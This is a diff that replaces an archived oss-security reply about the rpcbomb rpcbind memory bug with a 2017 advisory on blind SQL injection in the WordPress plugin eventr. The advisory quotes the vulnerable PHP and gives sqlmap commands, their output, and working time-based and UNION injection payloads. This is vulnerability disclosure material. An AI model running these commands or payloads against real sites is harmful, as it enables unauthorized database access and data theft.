@@ -1,47 +1,83 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/05/05/2
-Message-ID: <756cef1f-ab04-dbc3-a80a-67fbae7e4cab@redhat.com>
-Date: Fri, 5 May 2017 11:52:49 +0200
-From: Florian Weimer <fweimer@...hat.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: rpcbomb: remote rpcbind denial-of-service
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/05/30/3
+Message-id: <2B1EB846-CCB8-4220-8BA4-DF901A13364F@me.com>
+Date: Tue, 30 May 2017 07:35:44 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Blind SQL Injection in Wordpress plugin eventr v1.02.2
 Content-Type: text/plain; charset=utf-8
 
-On 05/05/2017 11:22 AM, Marcus Meissner wrote:
-> On Wed, May 03, 2017 at 05:55:20PM -0700, Seth Arnold wrote:
->> On Wed, May 03, 2017 at 08:55:23PM +0200, Guido Vranken wrote:
->>> This vulnerability allows an attacker to allocate any amount of bytes
->>> (up to 4 gigabytes per attack) on a remote rpcbind host, and the
->>> memory is never freed unless the process crashes or the administrator
->>> halts or restarts the rpcbind service.
->>> [...]
->>> An extensive write-up can be found here:
->>> https://guidovranken.wordpress.com/2017/05/03/rpcbomb-remote-rpcbind-denial-of-service-patches/
->>>
->>> Exploit + patches: https://github.com/guidovranken/rpcbomb/
->>
->> Hello Guido, nice find. Have CVE numbers been requested for this issue
->> yet? Have you investigated if ntirpc is affected too? Much of the code
->> looks similar:
->>
->> http://sources.debian.net/src/ntirpc/1.4.3-3/src/rpc_generic.c/#L728
-> 
-> We also saw glibc affected.
-> 
-> https://bugzilla.suse.com/show_bug.cgi?id=1037559#c7
-> 
-> That said, your reproducer allocates virtual memory, and on systems with overcommit
-> there is only neglible impact on overall memory pressure.
-> 
-> The rpc service will however likely crash at some point though when there is no virtual
-> address space left for it.
+Title: Blind SQL Injection in Wordpress plugin eventr v1.02.2
+Author: Larry W. Cashdollar, @_larry0
+Date: 2017-05-21
+CVE-ID:[CVE-2017-1002018][CVE-2017-1002019]
+Download Site: https://wordpress.org/plugins/eventr/
+Vendor: http://www.binnyva.com/
+Vendor Notified: 2017-05-22
+Vendor Contact: plugins@...dpress.org
+Advisory: http://www.vapidlabs.com/advisory.php?v=192
+Description: Use this plugin if you want to use your blog an event management tool.
+Vulnerability:
+The edit form and attendees.php code do not sanitize input to $_REQUSET[event] this allows blind time-based SQL injection by an authenticated user who is able to modify events.
 
-Thanks, I filed it upstream as well:
+CVE-2017-1002018
+In attendees.php:
 
-https://sourceware.org/bugzilla/show_bug.cgi?id=21461
+40 $search = '';
+ 41 if(isset($_REQUEST['search']) and $_REQUEST['search']) $search = "AND A.name LIKE '%$_REQUEST[search]%'";
+ 42 
+ 43 $all_attendee = $wpdb->get_results("SELECT A.ID,A.name,A.url,A.email, EA.added_on, A.status FROM `{$wpdb->prefix}eventr_attendee` AS A
+ 44                                                                                 INNER JOIN `{$wpdb->prefix}eventr_event_attendee` AS EA ON attendee_ID=A.ID
+ 45                                                                                 WHERE EA.event_ID=$_REQUEST[event] $search ORDER BY A.name LIMIT $offset, $items    _per_page");
 
-Looks like both xdr_bytes and xdr_string have a similar bug.
+CVE-2017-1002019
 
-I'd appreciate some guidance on reusing or not reusing CVE IDs here.
+In event_form.php:
 
-Florian
+  5 $action = 'new';
+  6 if($_REQUEST['action'] == 'edit') $action = 'edit';
+  7 
+  8 $event = array();
+  9 if($action == 'edit') {
+ 10         $event = $wpdb->get_row("SELECT name,description,event_date,maximum_attendees,landing_page,status FROM {$wpdb->prefix}eventr_event WHERE ID = $_REQUEST[event]");
+ 11 }
+
+Exploit Code:
+	• $ sqlmap -u 'http://example.com/wordpress/wp-admin/edit.php?page=eventr%2Fattendees.php&event=*' --dbms mysql  --level 3 --risk 3 --load-cookies=./cookies.txt
+	•  
+	• URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+	• sqlmap identified the following injection point(s) with a total of 1250 HTTP(s) requests:
+	• ---
+	• Parameter: #1* (URI)
+	•     Type: AND/OR time-based blind
+	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+	•     Payload: http://example.com:80/wordpress/wp-admin/edit.php?page=eventr/attendees.php&event=(SELECT * FROM (SELECT(SLEEP(5)))qppS)
+	•  
+	•     Type: UNION query
+	•     Title: Generic UNION query (random number) - 6 columns
+	•     Payload: http://example.com:80/wordpress/wp-admin/edit.php?page=eventr/attendees.php&event=-2450 UNION ALL SELECT CONCAT(0x716a7a6a71,0x566d4a744c4353656f664d75435376426a736e4d7056476e4d536a465169736e654b4252777a7161,0x716a766271),9012,9012,9012,9012,9012-- pgAi
+	• ---
+	• [20:38:00] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Ubuntu 16.04 (xenial)
+	• web application technology: Apache 2.4.18
+	• back-end DBMS: MySQL >= 5.0.12
+	• [20:38:00] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
+	•  
+	• [*] shutting down at 20:38:00
+	•  
+	• $ sqlmap -u 'http://example.com/wordpress/wp-admin/edit.php?page=eventr%2Fevent_form.php&event=*&action=edit' --dbms mysql  --level 3 --risk 3 --load-cookies=./cookies.txt
+	•  
+	• sqlmap identified the following injection point(s) with a total of 1476 HTTP(s) requests:
+	• ---
+	• Parameter: #1* (URI)
+	•     Type: AND/OR time-based blind
+	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+	•     Payload: http://example.com:80/wordpress/wp-admin/edit.php?page=eventr/event_form.php&event=(CASE WHEN (9111=9111) THEN SLEEP(5) ELSE 9111 END)&action=edit
+	• ---
+	• [06:58:46] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Ubuntu 16.04 (xenial)
+	• web application technology: Apache 2.4.18
+	• back-end DBMS: MySQL >= 5.0.12
+	• [06:58:46] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
+	•  
+	• [*] shutting down at 06:58:46
